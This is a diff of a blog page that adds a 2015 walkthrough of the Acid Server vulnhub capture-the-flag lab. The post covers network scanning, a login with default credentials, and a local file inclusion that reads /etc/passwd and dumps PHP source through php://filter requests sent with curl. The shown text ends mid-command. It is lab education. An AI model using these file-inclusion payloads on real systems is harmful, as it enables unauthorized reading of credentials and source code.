@@ -9,7 +9,9 @@
   <meta name="author" content="Andrew Emil">
 
   
-  <meta name="description" content=" Blog Archives Recent Posts ">
+  <meta name="description" content="Acid Server is a boot2root challenge built by Avinash
+and hosted by vulnhub.
+The challenge is completely focused on web exploitation and the end goal &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -80,6 +82,827 @@
       <div class="blog-index">
   
   
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/08/22/acid-server-1-walkthrough/">Acid Server: 1 Walkthrough</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-08-22T15:58:42-04:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>3:58 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="https://www.vulnhub.com/entry/acid-server-1,125/">Acid Server</a> is a boot2root challenge built by <a href="https://twitter.com/@m_avinash143">Avinash</a>
+and hosted by <a href="https://www.vulnhub.com">vulnhub</a>.
+The challenge is completely focused on web exploitation and the end goal is to escalate the privileges to root and capture the flag.
+This walkthrough shows how I solved the challenge so let the fun begin!</p>
+
+<p>After booting Acid Server and Kali on virtual box (Bridged Adapter), I used netdiscover to find the ip address of Acid server:</p>
+
+<figure class='code'><figcaption><span>Netdiscover</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# netdiscover -i eth0 -r 192.168.2.0/24
+</span><span class='line'>
+</span><span class='line'>Currently scanning: Finished!   <span class="p">|</span>   Screen View: Unique Hosts
+</span><span class='line'>
+</span><span class='line'> <span class="m">3</span> Captured ARP Req/Rep packets, from <span class="m">3</span> hosts.   Total size: <span class="m">180</span>
+</span><span class='line'> _____________________________________________________________________________
+</span><span class='line'>   IP            At MAC Address      Count  Len   MAC Vendor
+</span><span class='line'> -----------------------------------------------------------------------------
+</span><span class='line'> 192.168.2.1     80:1f:02:fa:e0:68    <span class="m">01</span>    <span class="m">060</span>   Unknown vendor
+</span><span class='line'> 192.168.2.101   60:36:dd:a2:0c:56    <span class="m">01</span>    <span class="m">060</span>   Unknown vendor
+</span><span class='line'> 192.168.2.102   08:00:27:ab:54:a5    <span class="m">01</span>    <span class="m">060</span>   CADMUS COMPUTER SYSTEMS
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So, Acid&rsquo;t ip address is 192.168.2.102 and our kalis ip address is 192.168.2.108 as shown below:</p>
+
+<figure class='code'><figcaption><span>Kali's Ip Address</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ifconfig
+</span><span class='line'>eth0      Link encap:Ethernet  HWaddr 08:00:27:4b:6e:05
+</span><span class='line'>          inet addr:192.168.2.108  Bcast:192.168.2.255  Mask:255.255.255.0
+</span><span class='line'>          inet6 addr: fe80::a00:27ff:fe4b:6e05/64 Scope:Link
+</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+</span><span class='line'>          RX packets:74436 errors:0 dropped:0 overruns:0 frame:0
+</span><span class='line'>          TX packets:71879 errors:0 dropped:0 overruns:0 carrier:0
+</span><span class='line'>          collisions:0 txqueuelen:1000
+</span><span class='line'>          RX bytes:64902394 <span class="o">(</span>61.8 MiB<span class="o">)</span>  TX bytes:10008245 <span class="o">(</span>9.5 MiB<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>lo        Link encap:Local Loopback
+</span><span class='line'>          inet addr:127.0.0.1  Mask:255.0.0.0
+</span><span class='line'>          inet6 addr: ::1/128 Scope:Host
+</span><span class='line'>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+</span><span class='line'>          RX packets:3374 errors:0 dropped:0 overruns:0 frame:0
+</span><span class='line'>          TX packets:3374 errors:0 dropped:0 overruns:0 carrier:0
+</span><span class='line'>          collisions:0 txqueuelen:0
+</span><span class='line'>          RX bytes:3370707 <span class="o">(</span>3.2 MiB<span class="o">)</span>  TX bytes:3370707 <span class="o">(</span>3.2 MiB<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Nmap</h3>
+
+<p>Lets find what services are running on Acid using nmap:</p>
+
+<figure class='code'><figcaption><span>Nmap Scan</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -sS -p- -A -T5 192.168.2.102
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2015-08-23 12:14 EDT
+</span><span class='line'>Nmap scan report <span class="k">for</span> 192.168.2.102
+</span><span class='line'>Host is up <span class="o">(</span>0.00053s latency<span class="o">)</span>.
+</span><span class='line'>Not shown: <span class="m">65534</span> closed ports
+</span><span class='line'>PORT      STATE SERVICE VERSION
+</span><span class='line'>33447/tcp open  http    Apache httpd 2.4.10 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span><span class='line'><span class="p">|</span>_http-title: /Challenge
+</span><span class='line'>MAC Address: 08:00:27:AB:54:A5 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
+</span><span class='line'>Device <span class="nb">type</span>: general purpose
+</span><span class='line'>Running: Linux 3.X
+</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
+</span><span class='line'>OS details: Linux 3.11 - 3.14
+</span><span class='line'>Network Distance: <span class="m">1</span> hop
+</span><span class='line'>
+</span><span class='line'>TRACEROUTE
+</span><span class='line'>HOP RTT     ADDRESS
+</span><span class='line'><span class="m">1</span>   0.53 ms 192.168.2.102
+</span><span class='line'>
+</span><span class='line'>OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 17.97 seconds
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nmap found that apache web server was running on port 33447,so lets visit the main index page for the web service <a href="http://192.168.2.102:33447/">http://192.168.2.102:33447/</a></p>
+
+<p><img class="center" src="/images/2015/1/image 1.png"></p>
+
+<p>It seems that there isn&rsquo;t anything useful here, so my next destination was dirbuster to find any hidden directories or files that might be interesting:</p>
+
+<p>Note:I used directory-list-2.3-medium.txt wordlist which is located in /usr/share/dirbuster/wordlist/</p>
+
+<p><img class="center" src="/images/2015/1/image 2.png"></p>
+
+<p>So, Dirbuster found a new directory named &ldquo;Challenge&rdquo;, and the index page &ldquo;<a href="http://192.168.2.102:33447/Challenge/js/index.js">http://192.168.2.102:33447/Challenge/js/index.js</a>&rdquo; of this directory is a login form as we can see:</p>
+
+<p><img class="center" src="/images/2015/1/image 3.png"></p>
+
+<p>Lets examine the page source to see if we can identify the script behind this login form:</p>
+
+<p><img class="center" src="/images/2015/1/image 4.png"></p>
+
+<p>And examining form.js script as well:</p>
+
+<figure class='code'><figcaption><span>form.js</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>/* * Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2013</span> peredur.net * * This program is free software: you can redistribute it and/or modify * it under the terms of the
+</span><span class='line'> GNU General Public License as published by * the Free Software Foundation, either version <span class="m">3</span> of the License, or * <span class="o">(</span>at your option<span class="o">)</span> any later version. * * This program is distributed in the hope that it will be useful,
+</span><span class='line'>* but WITHOUT ANY WARRANTY<span class="p">;</span> without even the implied warranty of * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the * GNU General Public License <span class="k">for</span> more details.
+</span><span class='line'> * * You should have received a copy of the GNU General Public License * along with this program. If not, see &lt;http://www.gnu.org/licenses/&gt;. */
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After searching for the login script in google using keywords &ldquo;secure login peredur.net&rdquo;, I found its main <a href="https://github.com/peredurabefrog/phpSecureLogin">github repository</a> and the default dabtabase
+is configured with a default user &ldquo;test_user&rdquo; as you can see in the description of the github repo:</p>
+
+<figure class='code'><figcaption><span>snippet from phpsecurelogin repo</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>The code to create and populate the necessary tables is included in the <span class="s1">&#39;secure_login.sql&#39;</span> file. It populates the members table with a single user with the following details:
+</span><span class='line'>
+</span><span class='line'>Username : test_user Email : <span class="nb">test</span>@example.com Password : 6ZaxN2Vzm9NUJT2y
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After logging into the admin panel using the test_user credentials, there is a sec_session_id cookie assigned which I will use it later along aside with the cURL utility:</p>
+
+<p><a href="http://192.168.2.102:33447/Challenge/protected_page.php">http://192.168.2.102:33447/Challenge/protected_page.php</a></p>
+
+<p><img class="center" src="/images/2015/1/image 5.png"></p>
+
+<p>We can see session cookie assigned using <a href="https://addons.mozilla.org/ar/firefox/addon/live-http-headers/">Live Http Headers</a> firefox add-on:</p>
+
+<p>Set-Cookie: sec_session_id=64uk8pthsvr3939mm9joa5u254; path=/; HttpOnly</p>
+
+<p><img class="center" src="/images/2015/1/image 6.png"></p>
+
+<p><a href="http://192.168.2.102:33447/Challenge/include.php">http://192.168.2.102:33447/Challenge/include.php</a></p>
+
+<p><img class="center" src="/images/2015/1/image 7.png"></p>
+
+<p>Reading /etc/passwd</p>
+
+<p><a href="http://192.168.2.102:33447/Challenge/include.php?file=%2Fetc%2Fpasswd&amp;add=Extract+File">http://192.168.2.102:33447/Challenge/include.php?file=%2Fetc%2Fpasswd&amp;add=Extract+File</a></p>
+
+<p><img class="center" src="/images/2015/1/image 8.png"></p>
+
+<p>At this point, I tried to get RCE using the LFI vulnerability by using apache log poisining, reading /proc/self/environ, or any logs in the file descriptor.
+But it seems the apache user doesn&rsquo;t have any read access on those files and only php://filter wrappter worked which is very useful to further enumerate
+the php files
+There is only one readable file descriptor  /proc/self/fd/14 but I found later after examining the files that it includes only php sessions which weren'y controlable by any mean so it was usless.</p>
+
+<h3>File Descriptor 14:</h3>
+
+<figure class='code'><figcaption><span>/proc/self/fd/14</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> http://192.168.2.102:33447/Challenge/include.php?file<span class="o">=</span><span class="k">$(</span>php -r <span class="s2">&quot;echo urlencode(&#39;/proc/self/fd/14&#39;);&quot;</span><span class="k">)</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;html&gt;/,/*/d&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;&lt;&#39;</span> -f 1
+</span><span class='line'>
+</span><span class='line'>index_page<span class="p">|</span>i:1440350358<span class="p">;</span>user_id<span class="p">|</span>s:1:<span class="s2">&quot;1&quot;</span><span class="p">;</span>username<span class="p">|</span>s:9:<span class="s2">&quot;test_user&quot;</span><span class="p">;</span>login_string<span class="p">|</span>s:128:<span class="s2">&quot;8cc28bf7a16672373346a20752ed5f7e5988d7ee63787ba06daeaa1e0cdbaa74c463ca52eb96ed6a2a4431b2c748671b7de162aa2da4d7e395791ad1d4d03d39&quot;</span><span class="p">;</span>protected_page<span class="p">|</span>i:1440350424<span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>include.php source:</h3>
+
+<figure class='code'><figcaption><span>include.php source code </span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> http://192.168.2.102:33447/Challenge/include.php?file<span class="o">=</span><span class="k">$(</span>php -r <span class="s2">&quot;echo urlencode(&#39;php://filter/convert.base64-encode/resource=include.php&#39;);&quot;</span><span class="k">)</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;html&gt;/,/*/d&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;&lt;&#39;</span> -f 1
+</span><span class='line'>
+</span><span class='line'>PD9waHAKaW5jbHVkZV9vbmNlICdpbmNsdWRlcy9kYl9jb25uZWN0LnBocCc7CmluY2x1ZGVfb25jZSAnaW5jbHVkZXMvZnVuY3Rpb25zLnBocCc7CgpzZWNfc2Vzc2lvbl9zdGFyd
+</span><span class='line'>CgpOwokX1NFU1NJT05bJ2xvbCddPXRpbWUoKTsKCmlmICghaXNzZXQoJF9TRVNTSU9OWydwcm90ZWN0ZWRfcGFnZSddKSl7CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogcHJvdG
+</span><span class='line'>VjdGVkX3BhZ2UucGhwJyk7CiAgICAgICAgZXhpdDsKfQppZiAoIWlzc2V0KCRfU0VTU0lPTlsnaW5kZXhfcGFnZSddKSl7CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogcHJvdGV
+</span><span class='line'>jdGVkX3BhZ2UucGhwJyk7CiAgICAgICAgZXhpdDsKfQo/PgoKPD9waHAgCiRmaWxlID0gJF9HRVRbJ2ZpbGUnXTsKaW5jbHVkZSgkZmlsZSk7Cj8+CjwhRE9DVFlQRSBodG1sPgo8
+</span><span class='line'>aHRtbD4KICAgICAgICA8aGVhZD4KICAgICAgICAgICAgICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgICAgICAgICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZ
+</span><span class='line'>j0iY3NzL3N0eWxlLmNzcyI+CiAgICAgICAgICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlcy9tYWluLmNzcyIgLz4KICAgICAgICAgICAgICAgIDx0aX
+</span><span class='line'>RsZT5UcnkgdG8gRXh0cmFjdCBKdWljeSBkZXRhaWxzPC90aXRsZT4KICAgICAgICA8L2hlYWQ+CiAgICAgICAgPGJvZHk+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ3cmF
+</span><span class='line'>wcGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJCTxwPiA8aDE+SG1tLi4uSXQgbG9va3MgbGlrZSB0aGF0IHlvdSBrbm93IHlv
+</span><span class='line'>dXIgdGhpbmdzPC9oMT4gPGJyPiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zm9ybSBtZXRob2Q9ImdldCIgYWN0aW9uPSI8P3BocCAkX1BIUF9TRUxGID8+Ij4KI
+</span><span class='line'>CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbnRlciB0aGUgRmlsZSBuYW1lOjxpbnB1dCBuYW1lPSJmaWxlIiBwbGFjZWhvbGRlcj0iRmlsZSBOYW1lIiB0eXBlPSJ0ZX
+</span><span class='line'>h0IiBpZD0iaWQiIG1heGxlbmd0aD0iMjAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBuYW1lPSJhZGQiIHR5cGU9InN1Ym1pdCIgaWQ9ImFkZCIgdmF
+</span><span class='line'>sdWU9IkV4dHJhY3QgRmlsZSI+CiAgPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCjwhLS0weDU5MzM1NjZhNGM2
+</span><span class='line'><span class="nv">ZTRhMzQ2MjZlNDEzZC0tPgo</span><span class="o">=</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Decoded to:</h3>
+
+<figure class='code'><figcaption><span>Decoding the base64 of include.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# <span class="nb">echo </span>PD9waHAKaW5jbHVkZV9vbmNlICdpbmNsdWRlcy9kYl9jb25uZWN0LnBocCc7CmluY2x1ZGVfb25jZSAnaW5jbHVkZXMvZnVuY3Rpb25zLnBocCc7CgpzZWN
+</span><span class='line'>fc2Vzc2lvbl9zdGFydCgpOwokX1NFU1NJT05bJ2xvbCddPXRpbWUoKTsKCmlmICghaXNzZXQoJF9TRVNTSU9OWydwcm90ZWN0ZWRfcGFnZSddKSl7CiAgICAgICAgaGVhZGVyKCdM
+</span><span class='line'>b2NhdGlvbjogcHJvdGVjdGVkX3BhZ2UucGhwJyk7CiAgICAgICAgZXhpdDsKfQppZiAoIWlzc2V0KCRfU0VTU0lPTlsnaW5kZXhfcGFnZSddKSl7CiAgICAgICAgaGVhZGVyKCdMb
+</span><span class='line'>2NhdGlvbjogcHJvdGVjdGVkX3BhZ2UucGhwJyk7CiAgICAgICAgZXhpdDsKfQo/PgoKPD9waHAgCiRmaWxlID0gJF9HRVRbJ2ZpbGUnXTsKaW5jbHVkZSgkZmlsZSk7Cj8+CjwhRE
+</span><span class='line'>9DVFlQRSBodG1sPgo8aHRtbD4KICAgICAgICA8aGVhZD4KICAgICAgICAgICAgICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgICAgICAgICAgICAgIDxsaW5rIHJlbD0ic3R
+</span><span class='line'>5bGVzaGVldCIgaHJlZj0iY3NzL3N0eWxlLmNzcyI+CiAgICAgICAgICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlcy9tYWluLmNzcyIgLz4KICAgICAg
+</span><span class='line'>ICAgICAgICAgIDx0aXRsZT5UcnkgdG8gRXh0cmFjdCBKdWljeSBkZXRhaWxzPC90aXRsZT4KICAgICAgICA8L2hlYWQ+CiAgICAgICAgPGJvZHk+CiAgICAgICAgICAgICAgICA8Z
+</span><span class='line'>Gl2IGNsYXNzPSJ3cmFwcGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJCTxwPiA8aDE+SG1tLi4uSXQgbG9va3MgbGlrZSB0aG
+</span><span class='line'>F0IHlvdSBrbm93IHlvdXIgdGhpbmdzPC9oMT4gPGJyPiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zm9ybSBtZXRob2Q9ImdldCIgYWN0aW9uPSI8P3BocCAkX1B
+</span><span class='line'>IUF9TRUxGID8+Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbnRlciB0aGUgRmlsZSBuYW1lOjxpbnB1dCBuYW1lPSJmaWxlIiBwbGFjZWhvbGRlcj0iRmlsZSBO
+</span><span class='line'>YW1lIiB0eXBlPSJ0ZXh0IiBpZD0iaWQiIG1heGxlbmd0aD0iMjAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBuYW1lPSJhZGQiIHR5cGU9InN1Ym1pd
+</span><span class='line'>CIgaWQ9ImFkZCIgdmFsdWU9IkV4dHJhY3QgRmlsZSI+CiAgPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCjwhLS
+</span><span class='line'><span class="nv">0weDU5MzM1NjZhNGM2ZTRhMzQ2MjZlNDEzZC0tPgo</span><span class="o">=</span> <span class="p">|</span> base64 --decode
+</span><span class='line'>&lt;?php
+</span><span class='line'>include_once <span class="s1">&#39;includes/db_connect.php&#39;</span><span class="p">;</span>
+</span><span class='line'>include_once <span class="s1">&#39;includes/functions.php&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>sec_session_start<span class="o">()</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;lol&#39;</span><span class="o">]=</span><span class="nb">time</span><span class="o">()</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="o">(</span>!isset<span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;protected_page&#39;</span><span class="o">])){</span>
+</span><span class='line'>        header<span class="o">(</span><span class="s1">&#39;Location: protected_page.php&#39;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>        <span class="nb">exit</span><span class="p">;</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'><span class="k">if</span> <span class="o">(</span>!isset<span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;index_page&#39;</span><span class="o">])){</span>
+</span><span class='line'>        header<span class="o">(</span><span class="s1">&#39;Location: protected_page.php&#39;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>        <span class="nb">exit</span><span class="p">;</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>?&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;?php
+</span><span class='line'><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">]</span><span class="p">;</span>
+</span><span class='line'>include<span class="o">(</span><span class="nv">$file</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>?&gt;
+</span><span class='line'>&lt;!DOCTYPE html&gt;
+</span><span class='line'>&lt;html&gt;
+</span><span class='line'>        &lt;head&gt;
+</span><span class='line'>                &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>&gt;
+</span><span class='line'>                &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;css/style.css&quot;</span>&gt;
+</span><span class='line'>                &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;styles/main.css&quot;</span> /&gt;
+</span><span class='line'>                &lt;title&gt;Try to Extract Juicy details&lt;/title&gt;
+</span><span class='line'>        &lt;/head&gt;
+</span><span class='line'>        &lt;body&gt;
+</span><span class='line'>                &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;wrapper&quot;</span>&gt;
+</span><span class='line'>                        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;container&quot;</span>&gt;
+</span><span class='line'>              &lt;p&gt; &lt;h1&gt;Hmm...It looks like that you know your things&lt;/h1&gt; &lt;br&gt;
+</span><span class='line'>                                &lt;form <span class="nv">method</span><span class="o">=</span><span class="s2">&quot;get&quot;</span> <span class="nv">action</span><span class="o">=</span><span class="s2">&quot;&lt;?php $_PHP_SELF ?&gt;&quot;</span>&gt;
+</span><span class='line'>                                Enter the File name:&lt;input <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;file&quot;</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">&quot;File Name&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;id&quot;</span> <span class="nv">maxlength</span><span class="o">=</span><span class="s2">&quot;20&quot;</span>&gt;
+</span><span class='line'>                                &lt;input <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;add&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;add&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;Extract File&quot;</span>&gt;
+</span><span class='line'>  &lt;/body&gt;
+</span><span class='line'>&lt;/html&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Protected page source:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> http://192.168.2.102:33447/Challenge/include.php?file<span class="o">=</span><span class="k">$(</span>php -r <span class="s2">&quot;echo urlencode(&#39;php://filter/convert.base64-encode/resource=protected_page.php&#39;);&quot;</span><span class="k">)</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;html&gt;/,/*/d&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;&lt;&#39;</span> -f <span class="m">1</span> <span class="p">|</span> base64 --decode
+</span><span class='line'>&lt;?php
+</span><span class='line'>include_once <span class="s1">&#39;includes/db_connect.php&#39;</span><span class="p">;</span>
